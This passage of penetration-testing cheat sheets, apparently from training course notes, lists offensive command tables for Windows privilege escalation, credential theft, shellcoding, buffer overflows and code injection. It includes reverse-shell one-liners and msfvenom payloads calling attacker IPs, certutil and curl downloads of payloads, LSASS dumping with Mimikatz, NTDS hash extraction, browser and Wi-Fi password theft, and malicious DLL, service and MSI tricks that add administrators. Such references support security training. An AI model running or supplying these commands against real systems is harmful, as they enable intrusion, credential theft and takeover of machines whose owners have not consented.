| `accesschk.exe /accepteula \\.\Pipe\lsass -v`                | Review permissions on a named pipe             |

#### Handy Commands

| **Command** | **Description** |
| --------------|-------------------|
| `mssqlclient.py sql_dev@10.129.43.30 -windows-auth` | Connect using mssqlclient.py |
| `enable_xp_cmdshell`                            | Enable xp_cmdshell with mssqlclient.py |
| `xp_cmdshell whoami`                                 | Run OS commands with xp_cmdshell |
| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *` | Escalate privileges with JuicyPotato                       |
| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"` | Escalating privileges with PrintSpoofer                    |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp`           | Take memory dump with ProcDump                             |
| `sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords` | Use MimiKatz to extract credentials from LSASS memory dump |
| `dir /q C:\backups\wwwroot\web.config`                       | Checking ownership of a file                               |
| `takeown /f C:\backups\wwwroot\web.config`                   | Taking ownership of a file                                 |
| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}` | Confirming changed ownership of a file                     |
| `icacls “C:\backups\wwwroot\web.config” /grant htb-student:F` | Modifying a file ACL                                       |
| `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` | Extract hashes with secretsdump.py |
| `robocopy /B E:\Windows\NTDS .\ntds ntds.dit` | Copy files with ROBOCOPY |
| `wevtutil qe Security /rd:true /f:text \| Select-String "/user"` | Searching security event logs |
| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"` | Passing credentials to wevtutil |
| `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | Searching event logs with PowerShell |
| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` | Generate malicious DLL |
| `dnscmd.exe /config /serverlevelplugindll adduser.dll` | Loading a custom DLL with dnscmd |
| `wmic useraccount where name="netadm" get sid` | Finding a user's SID |
| `sc.exe sdshow DNS` | Checking permissions on DNS service |
| `sc stop dns` | Stopping a service |
| `sc start dns` | Starting a service |
| `reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` | Querying a registry key |
| `reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll` | Deleting a registry key |
| `sc query dns` | Checking a service status |
| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local` | Disabling the global query block list |
| `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3` | Adding a WPAD record |
| `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp` | Compile with cl.exe |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"` | Add reference to a driver (1) |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1` | Add reference to a driver (2) |
| `.\DriverView.exe /stext drivers.txt` and `cat drivers.txt \| Select-String -pattern Capcom` | Check if driver is loaded |
| `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys` | Using EopLoadDriver |
| `c:\Tools\PsService.exe security AppReadiness` | Checking service permissions with PsService |
| `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` | Modifying a service binary path |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` | Confirming UAC is enabled |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` | Checking UAC level |
| `[environment]::OSVersion.Version` | Checking Windows version |
| `cmd /c echo %PATH%` | Reviewing path variable |
| `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"` | Downloading file with cURL in PowerShell |
| `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll` | Executing custom dll with rundll32.exe |
| `.\SharpUp.exe audit` | Running SharpUp |
| `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"` | Checking service permissions with icacls |
| `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"` | Replace a service binary |
| `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """` |Searching for unquoted service paths|
| `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services` |Checking for weak service ACLs in the Registry|
| `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"` |Changing ImagePath with PowerShell|
| `Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl` |Check startup programs|
| `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe` |Generating a malicious binary|
| `get-process -Id 3324` |Enumerating a process ID with PowerShell|
| `get-service \| ? {$_.DisplayName -like 'Druva*'}` |Enumerate a running service by name with PowerShell|

#### Credential Theft

| **Command** | **Description** |
| --------------|-------------------|
| `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml` |Search for files with the phrase "password"|
| `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password` |Searching for passwords in Chrome dictionary files|
| `(Get-PSReadLineOption).HistorySavePath` |Confirm PowerShell history save path|
| `gc (Get-PSReadLineOption).HistorySavePath` |Reading PowerShell history file|
| `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'` |Decrypting PowerShell credentials|
| `cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt` |Searching file contents for a string|
| `findstr /si password *.xml *.ini *.txt *.config` |Searching file contents for a string|
| `findstr /spin "password" *.*` |Searching file contents for a string|
| `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password` |Search file contents with PowerShell|
| `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` |Search for file extensions|
| `where /R C:\ *.config` |Search for file extensions|
| `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore` |Search for file extensions using PowerShell|
| `cmdkey /list` | List saved credentials |
| `.\SharpChrome.exe logins /unprotect` | Retrieve saved Chrome credentials |
| `.\lazagne.exe -h` | View LaZagne help menu |
| `.\lazagne.exe all` | Run all LaZagne modules |
| `Invoke-SessionGopher -Target WINLPE-SRV01` | Running SessionGopher |
| `netsh wlan show profile` | View saved wireless networks |
| `netsh wlan show profile ilfreight_corp key=clear` | Retrieve saved wireless passwords |

#### Other Commands

| **Command** | **Description** |
| --------------|-------------------|
| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat` | Transfer file with certutil |
| `certutil -encode file1 encodedfile` | Encode file with certutil |
| `certutil -decode encodedfile file2` | Decode file with certutil |
| `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` | Query for always install elevated registry key (1) |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | Query for always install elevated registry key (2) |
| `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi` | Generate a malicious MSI package |
| `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart` | Executing an MSI package from command line |
| `schtasks /query /fo LIST /v` | Enumerate scheduled tasks |
| `Get-ScheduledTask \| select TaskName,State` | Enumerate scheduled tasks with PowerShell |
| `.\accesschk64.exe /accepteula -s -d C:\Scripts\` | Check permissions on a directory |
| `Get-LocalUser` | Check local user description field |
| `Get-WmiObject -Class Win32_OperatingSystem \| select Description` | Enumerate computer description field |
| `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd` |Mount VMDK on Linux|
| `guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1` |Mount VHD/VHDX on Linux|
| `sudo python2.7 windows-exploit-suggester.py  --update` |Update Windows Exploit Suggester database|
| `python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` |Running Windows Exploit Suggester|

# Lateral Movement
# Proof-of-Concept

## 34. Introduction to Python 3
## Intro to Assembly Language

### Cheatsheet

#### Registers

| Description | 64-bit Register (8-bytes) | 8-bit Register (1-bytes) |
| ----- | ----- | ----- |
| **Data/Arguments Registers** |
| Syscall Number/Return value | `rax` | `al` |
| Callee Saved | `rbx` | `bl` |
| 1st arg | `rdi` | `dil` |
| 2nd arg | `rsi` | `sil` |
| 3rd arg | `rdx` | `dl` |
| 4th arg - Loop Counter | `rcx` | `cl` |
| 5th arg | `r8` | `r8b` |
| 6th arg | `r9` | `r9b` |
| **Pointer Registers** |
| Base Stack Pointer | `rbp` | `bpl` |
| Current/Top Stack Pointer | `rsp` | `spl` |
| Instruction Pointer 'call only' | `rip` | `ipl` |

#### Assembly and Disassembly

| **Command**   | **Description**   |
| --------------|-------------------|
| `nasm -f elf64 helloWorld.s` | Assemble code |
| `ld -o helloWorld helloWorld.o` | Link code |
| `ld -o fib fib.o -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2` | Link code with libc functions |
| `objdump -M intel -d helloWorld` | Disassemble `.text` section |
| `objdump -M intel --no-show-raw-insn --no-addresses -d helloWorld` | Show binary assembly code |
| `objdump -sj .data helloWorld` | Disassemble `.data` section |

#### GDB

| **Command**   | **Description**   |
| --------------|-------------------|
| `gdb -q ./helloWorld` | Open binary in gdb |
| `info functions` | View binary functions |
| `info variables` | View binary variables |
| `registers` | View registers |
| `disas _start` | Disassemble label/function |
| `b _start` | Break label/function |
| `b *0x401000` | Break address |
| `r` | Run the binary |
| `x/4xg $rip` | Examine register "x/ count-format-size $register" |
| `si` | Step to the next instruction |
| `s` | Step to the next line of code |
| `ni` | Step to the next function |
| `c` | Continue to the next break point |
| `patch string 0x402000 "Patched!\\x0a"` | Patch address value |
| `set $rdx=0x9` | Set register value |

#### Assembly Instructions

| **Instruction** | **Description** | **Example** |
| ----- | ----- | ----- |
| **Data Movement** |
| `mov` | Move data or load immediate data | `mov rax, 1` -> `rax = 1` |
| `lea` | Load an address pointing to the value | `lea rax, [rsp+5]` -> `rax = rsp+5 ` |
| `xchg` | Swap data between two registers or addresses | `xchg rax, rbx` -> `rax = rbx, rbx = rax` |
| **Unary Arithmetic Instructions** |
| `inc` | Increment by 1 | `inc rax` -> `rax++` or `rax += 1` -> `rax = 2` |
| `dec` | Decrement by 1 | `dec rax` -> `rax--` or `rax -= 1` -> `rax = 0` |
| **Binary Arithmetic Instructions** |
| `add` | Add both operands | `add rax, rbx` -> `rax = 1 + 1` -> `2` |
| `sub` | Subtract Source from Destination (*i.e `rax = rax - rbx`*) | `sub rax, rbx` -> `rax = 1 - 1` -> `0` |
| `imul` | Multiply both operands | `imul rax, rbx` -> `rax = 1 * 1` -> `1` |
| **Bitwise Arithmetic Instructions** |
| `not` | Bitwise NOT (*invert all bits, 0->1 and 1->0*) | `not rax` -> `NOT 00000001` -> `11111110` |
| `and` | Bitwise AND (*if both bits are 1 -> 1, if bits are different -> 0*) | `and rax, rbx` -> `00000001 AND 00000010` -> `00000000` |
| `or` | Bitwise OR (*if either bit is 1 -> 1, if both are 0 -> 0*) | `or rax, rbx` -> `00000001 OR 00000010` -> `00000011` |
| `xor` | Bitwise XOR (*if bits are the same -> 0, if bits are different -> 1*) | `xor rax, rbx` -> `00000001 XOR 00000010` -> `00000011` |
| **Loops** |
| `mov rcx, x` | Sets loop (`rcx`) counter to `x` | `mov rcx, 3` |
| `loop` | Jumps back to the start of `loop` until counter reaches `0` | `loop exampleLoop` |
| **Branching** |
| `jmp` | Jumps to specified label, address, or location | `jmp loop` |
| `jz`  | Destination **equal to Zero** | `D = 0` |
| `jnz` | Destination **Not equal to Zero** |  `D != 0` |
| `js`  | Destination **is Negative** | `D < 0` |
| `jns` | Destination **is Not Negative** (i.e. 0 or positive) |  `D >= 0` |
| `jg`  | Destination **Greater than** Source | `D > S` |
| `jge` | Destination **Greater than or Equal** Source |  `D >= S` |
| `jl`  | Destination **Less than** Source | `D < S` |
| `jle` | Destination **Less than or Equal** Source |  `D <= S` |
| `cmp` | Sets `RFLAGS` by subtracting second operand from first operand (*i.e. first - second*) | `cmp rax, rbx` -> `rax - rbx` |
| **Stack** |
| `push` | Copies the specified register/address to the top of the stack | `push rax` |
| `pop` | Moves the item at the top of the stack to the specified register/address | `pop rax` |
| **Functions** |
| `call` | push the next instruction pointer `rip` to the stack, then jumps to the specified procedure | `call printMessage` |
| `ret` | pop the address at `rsp` into `rip`, then jump to it | `ret` |

#### Functions

| **Command**   | **Description**   |
| --------------|-------------------|
| `cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h \| grep write` | Locate `write` syscall number |
| `man -s 2 write` | `write` syscall man page |
| `man -s 3 printf` | `printf` libc man page |

**Syscall Calling Convention**
1. Save registers to stack
2. Set its syscall number in `rax`
3. Set its arguments in the registers
4. Use the `syscall` assembly instruction to call it

**Function Calling Convention**
1. `Save Registers` on the stack (*`Caller Saved`*)
2. Pass `Function Arguments` (*like syscalls*)
3. Fix `Stack Alignment`
3. Get Function's `Return Value` (*in `rax`*)

#### Shellcoding

| **Command**   | **Description**   |
| --------------|-------------------|
| `pwn asm 'push rax'  -c 'amd64'` | Instruction to shellcode |
| `pwn disasm '50' -c 'amd64'` | Shellcode to instructions |
| `python3 shellcoder.py helloworld` | Extract binary shellcode |
| `python3 loader.py '4831..0f05` | Run shellcode |
| `python assembler.py '4831..0f05` | Assemble shellcode into binary |
| **Shellcraft** |
| `pwn shellcraft -l 'amd64.linux'` | List available syscalls |
| `pwn shellcraft amd64.linux.sh` | Generate syscalls shellcode |
| `pwn shellcraft amd64.linux.sh -r` | Run syscalls shellcode |
| **Msfvenom** |
| `msfvenom -l payloads \| grep 'linux/x64'` | List available syscalls |
| `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'` | Generate syscalls shellcode |
| `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'` | Generate encoded syscalls shellcode |

**Shellcoding Requirements**
1. Does not contain variables
2. Does not refer to direct memory addresses
3. Does not contain any NULL bytes `00`

## Stack-Based Buffer Overflows on Linux x86
## Stack-Based Buffer Overflows on Windows x86

### Cheatsheet

#### Buffer Overflow Steps

1. Fuzzing Parameters
2. Controlling EIP
3. Identifying Bad Characters
4. Finding a Return Instruction
5. Jumping to Shellcode

#### Commands

| Command | Description |
| ----- | ----- |
| **General** |
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>` | RDP to Windows VM |
| `/usr/bin/msf-pattern_create -l 5000` | Create Pattern |
| `/usr/bin/msf-pattern_offset -q 31684630` | Find Pattern Offset |
| `netstat -a \|findstr LISTEN` | List listening ports on a Windows machine |
| `.\nc.exe 127.0.0.1 8888` | Interact with port |
| `msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'` | Generate Local Privesc Shellcode |
| `msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python' -b '\x00\0x0a'` | Generate Reverse Shell Shellcode |
| `nc -lvnp 1234` | Listen for reverse shell |
| **x32dbg** |
| `F3` | Open file |
| `alt+A` | Attach to a process |
| `alt+L` | Go to Logs Tab |
| `alt+E` | Go to Symbols Tab |
| `ctrl+f` | Search for instruction |
| `ctrl+b` | Search for pattern |
| `Search For>All Modules>Command` | Search all loaded modules for instruction |
| `Search For>All Modules>Pattern` | Search all loaded modules for pattern |
| **ERC** |
| `ERC --config SetWorkingDirectory C:\Users\htb-student\Desktop\` | Configure Working Directory |
| `ERC --pattern c 5000` | Create Pattern |
| `ERC --pattern o 1hF0` | Find Pattern Offset |
| `ERC --bytearray` | Generate All Characters Byte Array |
| `ERC --bytearray -bytes 0x00` | Generate Byte Array excluding certain bytes |
| `ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin` | Compare bytes in memory to a Byte Array file |
| `ERC --ModuleInfo` | List loaded modules and their memory protections |
| **Python** |
| `python -c "print('A'*10000)"` | Print fuzzing payload |
| `python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"` | Write fuzzing payload to a file |
| `breakpoint()` | Add breakpoint to Python exploit |
| `c` | Continue from breakpoint |

# Post-Engagement

## 35. Documentation & Reporting
## 36. Attacking Enterprise Networks

# Misc

## Whitebox Pentesting 101

### Cheatsheet

#### Local Debugging

| **Command**   | **Description**   |
| --------------|-------------------|
| `node server.js` | run server locally |
| `curl http://127.0.0.1:21440/admin -X POST -d '{}'` | curl POST request |
| `curl http://127.0.0.1:21440/admin -X POST -d '{"key":"this is just a test!"}'` | curl POST request with json data |

#### Exploitation

| **Code Injection Steps** |
| --------------|
| 1. Prepare the Payload |
| 2. Comment Out the Rest |
| 3. Even Quotes/Parentheses |
| 4. Escaping/Encoding Special Characters |
| 5. Examine Payload |

| **Command**   | **Description**   |
| --------------|-------------------|
| `jq -aR .` | Escape json input |
| `sudo tcpdump -i lo icmp` | Blind verification: Listen for pings |
| `ping -c 3 127.0.0.1` | Blind verification: ping injection test |
| `nc -lvnp 1234` | Remote Shell: start netcat listener |
| `nc -e /bin/bash 127.0.0.1 1234` | Remote Shell: send basic shell |

#### Helpful Websites

| **Website** |
| ----------------------------------|
| [Prettier](https://prettier.io/playground/) |
| [Url Encode/Decode](https://www.urlencoder.org/) |
| [Reverse Shells - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) |
